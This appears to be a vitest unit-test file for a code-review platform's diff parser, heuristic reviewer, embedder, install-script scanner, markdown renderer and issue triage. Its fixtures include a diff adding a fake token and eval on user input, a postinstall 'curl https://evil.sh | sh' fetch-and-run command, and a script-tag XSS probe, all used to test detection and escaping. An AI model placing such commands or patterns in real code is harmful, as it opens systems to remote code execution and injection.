// Unit tests for the pure engines: diff parser, heuristic review, embedder, scanner.

import { describe, it, expect } from "vitest";
import { parseUnifiedDiff } from "@forge/git";
import { heuristicReview } from "@forge/ai";
import { embedLocal, cosine } from "@forge/ai";
import { scanPackageJson } from "@forge/sandbox";
import { triageLabels, findDuplicateIssues } from "@forge/ai";

const SAMPLE_DIFF = `
diff --git a/src/auth.ts b/src/auth.ts
index 1234567..89abcde 100644
--- a/src/auth.ts
+++ b/src/auth.ts
@@ -1,4 +1,6 @@
 export function login(user: string) {
-  const ok = check(user);
+  const ok = checkPassword(user);
+  const ADMIN_TOKEN = "ghp_supersecretvalue123";
+  eval(user + "input");
   return ok;
 }
diff --git a/src/new.ts b/src/new.ts
new file mode 100644
index 0000000..1111111
--- /dev/null
+++ b/src/new.ts
@@ -0,0 +1,2 @@
+export const x = 1;
+export const y = 2;
`;

describe("parseUnifiedDiff", () => {
  const files = parseUnifiedDiff(SAMPLE_DIFF);

  it("parses two files", () => {
    expect(files).toHaveLength(2);
  });

  it("detects added vs modified", () => {
    expect(files[0]!.status).toBe("modified");
    expect(files[1]!.status).toBe("added");
    expect(files[1]!.oldPath).toBeNull();
  });

  it("counts additions and deletions with correct line anchors", () => {
    expect(files[0]!.additions).toBe(3);
    expect(files[0]!.deletions).toBe(1);
    const hunk = files[0]!.hunks[0]!;
    const addLines = hunk.lines.filter((l) => l.type === "add").map((l) => l.newLine);
    expect(addLines).toEqual([2, 3, 4]);
    const rmLines = hunk.lines.filter((l) => l.type === "remove").map((l) => l.oldLine);
    expect(rmLines).toEqual([2]);
  });
});

describe("heuristicReview (deterministic)", () => {
  const files = parseUnifiedDiff(SAMPLE_DIFF);
  const analysis = heuristicReview(files);
  const analysis2 = heuristicReview(parseUnifiedDiff(SAMPLE_DIFF));

  it("flags the hard-coded secret", () => {
    const secret = analysis.findings.find((f) => f.title === "Hard-coded secret");
    expect(secret).toBeTruthy();
    expect(secret!.severity).toBe("critical");
    expect(secret!.path).toBe("src/auth.ts");
    expect(secret!.line).toBe(3);
  });

  it("flags eval()", () => {
    expect(analysis.findings.some((f) => f.title === "Use of eval()")).toBe(true);
  });

  it("flags missing tests for changed source files", () => {
    expect(analysis.missingTestsFor).toContain("src/auth.ts");
  });

  it("produces a nonzero risk score, deterministically", () => {
    expect(analysis.riskScore).toBeGreaterThan(0);
    expect(analysis.riskScore).toBe(analysis2.riskScore);
    expect(analysis.findings.length).toBe(analysis2.findings.length);
  });

  it("no findings on a clean diff", () => {
    const clean = parseUnifiedDiff(`
diff --git a/a.ts b/a.ts
index 1..2 100644
--- a/a.ts
+++ b/a.ts
@@ -1,2 +1,2 @@
 const a = 1;
-const b = 2;
+const b = 3;
`);
    const result = heuristicReview(clean);
    expect(result.findings.filter((f) => f.severity === "critical")).toHaveLength(0);
  });
});

describe("local embedder", () => {
  it("produces unit vectors with stable similarity", () => {
    const a = embedLocal("function verifySession token hash expires", "verifySession");
    const norm = Math.sqrt(a.reduce((n, v) => n + v * v, 0));
    expect(norm).toBeCloseTo(1.0, 5);

    const b = embedLocal("session verification checks token expiry", "verifySession");
    const c = embedLocal("unrelated docker build cache layers", "buildCache");

    expect(cosine(a, b)).toBeGreaterThan(cosine(a, c));
  });

  it("is deterministic", () => {
    const x = embedLocal("hello world", null);
    const y = embedLocal("hello world", null);
    expect(x).toEqual(y);
  });
});

describe("lifecycle-script prescan", () => {
  it("blocks curl|sh install scripts", () => {
    const pkg = JSON.stringify({ scripts: { postinstall: "curl https://evil.sh | sh" } });
    expect(scanPackageJson(pkg).ok).toBe(false);
  });

  it("allows normal scripts", () => {
    const pkg = JSON.stringify({ scripts: { build: "tsc", test: "vitest" } });
    expect(scanPackageJson(pkg).ok).toBe(true);
  });

  it("tolerates null/invalid json", () => {
    expect(scanPackageJson(null).ok).toBe(true);
    expect(scanPackageJson("{nope").ok).toBe(true);
  });
});

// ---------- markdown renderer (no HTML passthrough) ----------

describe("markdown renderer", () => {
  it("renders bold, code, links as elements; raw HTML stays text", async () => {
    const React = await import("react");
    const { renderToStaticMarkup } = await import("react-dom/server");
    const mod = await import("../src/components/Markdown");
    const html = renderToStaticMarkup(
      React.createElement(mod.Markdown, {
        text: "**bold** and `code` and [link](https://example.com)\n<script>alert(1)</script>",
      }),
    );
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<code");
    expect(html).toContain("code</code>");
    expect(html).toContain('href="https://example.com"');
    // Raw HTML must NOT become an element — escaped as text.
    expect(html).not.toContain("<script>alert(1)</script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("renders fenced code blocks and lists", async () => {
    const React = await import("react");
    const { renderToStaticMarkup } = await import("react-dom/server");
    const mod = await import("../src/components/Markdown");
    const html = renderToStaticMarkup(
      React.createElement(mod.Markdown, { text: "- one\n- two\n\n```\nconst x = 1;\n```" }),
    );
    expect(html).toContain("<ul");
    expect(html).toContain("<pre");
    expect(html).toContain("const x = 1;");
  });
});


// ---------- issue auto-triage (deterministic) ----------

describe("triageLabels", () => {
  it("labels security issues with priority", () => {
    expect(triageLabels("Auth bypass via injection", "session check broken")).toEqual(["security", "bug"]);
  });

  it("caps at three labels, priority-ordered", () => {
    const out = triageLabels("Slow login docs bug performance feature", "");
    expect(out.length).toBeLessThanOrEqual(3);
    expect(out[0]).toBe("bug"); // rules are priority-ordered: security, bug, performance…
  });

  it("returns empty for unmatched text", () => {
    expect(triageLabels("hello world", "nothing here")).toEqual([]);
  });

  it("never duplicates labels across title and description", () => {
    const out = triageLabels("crash in login", "the crash happens on load");
    expect(out.filter((l) => l === "bug").length).toBe(1);
  });
});

// ---------- duplicate issue detection ----------

describe("findDuplicateIssues", () => {
  it("ranks near-identical issues above threshold", () => {
    const emb = embedLocal;
    const pool = [
      { number: 1, title: "Login page slow on mobile", description: null, embedding: emb("Login page slow on mobile\ntakes ages on phones", null) },
      { number: 2, title: "Add dark mode toggle", description: null, embedding: emb("Add dark mode toggle\nin settings menu", null) },
    ];
    const hits = findDuplicateIssues(
      { title: "Login screen very slow on phones", description: "mobile is sluggish" },
      pool,
    );
    expect(hits.length).toBeGreaterThan(0);
    expect(hits[0]!.number).toBe(1);
    expect(hits[0]!.similarity).toBeGreaterThan(0.42);
  });

  it("returns nothing for unrelated text", () => {
    const emb = embedLocal;
    const pool = [
      { number: 1, title: "Add dark mode toggle", description: null, embedding: emb("Add dark mode toggle\nin settings menu", null) },
    ];
    expect(findDuplicateIssues({ title: "Git push rejected", description: "cannot push" }, pool)).toEqual([]);
  });
});
